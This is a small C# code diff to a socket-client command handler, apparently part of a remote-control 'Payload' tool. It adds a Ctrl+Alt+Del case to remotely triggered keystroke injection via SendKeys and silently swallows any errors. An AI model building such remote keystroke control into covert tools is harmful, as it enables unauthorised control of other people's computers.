@@ -95,7 +95,12 @@ namespace Payload.Core.Command.SocketClient
                     case "{^w}":
                     case "{^t}":
                     case "{+^}":
-                        SendKeys.SendWait(msg);
+                    case "{^%DEL}":
+                        try
+                        {
+                            SendKeys.SendWait(msg);
+                        }
+                        catch { }
                         break;
                     default:
                         char[] ch = msg.ToCharArray();
